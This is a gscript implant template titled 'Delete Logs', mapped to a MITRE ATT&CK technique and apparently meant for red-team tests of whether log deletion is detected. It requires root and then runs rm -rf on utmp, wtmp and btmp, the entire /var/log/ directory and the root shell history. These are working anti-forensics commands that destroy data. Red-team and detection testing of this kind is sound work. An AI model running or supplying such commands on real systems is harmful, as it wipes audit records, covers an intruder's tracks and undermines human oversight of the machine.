// Example gscript template
// Title: Delete Logs
// Author: Jay Hill
// Purpose: Deletes a number of critical security logs on a linux machine, to see if this is detected by the lack of logs or deletion
// Gscript version: 0.1.2
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1146
// Note: must run implant as root

//priority:150
//timeout:150

function BeforeDeploy() {
  LogInfo("starting execution of Delete Logs");
  var well = GetUser();
  LogInfo("Our user is: "+well.username);
  if (well.username == "root") {
    return true;
  } else {
    LogInfo("Detected a non-root user, this needs to run as root!");
    Halt();
    return false;
  }
  return true; 
}

function Deploy() {  
  //rm -rf /var/run/utmp /var/run/wtmp /var/run/btmp /var/log/
  ForkExecuteCommand("rm", ["-rf", "-P", "/var/run/utmp", "/var/run/wtmp", "/var/run/btmp", "/var/log/"]);
  LogInfo("Removed /var/run/utmp, /var/run/wtmp, /var/run/btmp, and all of /var/log/");
  ForkExecuteCommand("rm", ["-rf", "-P", "/var/root/.sh_history"]);
  LogInfo("Cleared the root bash history");
  return true;
}

function AfterDeploy() {
  LogInfo("done Delete Logs");
  return true;
}
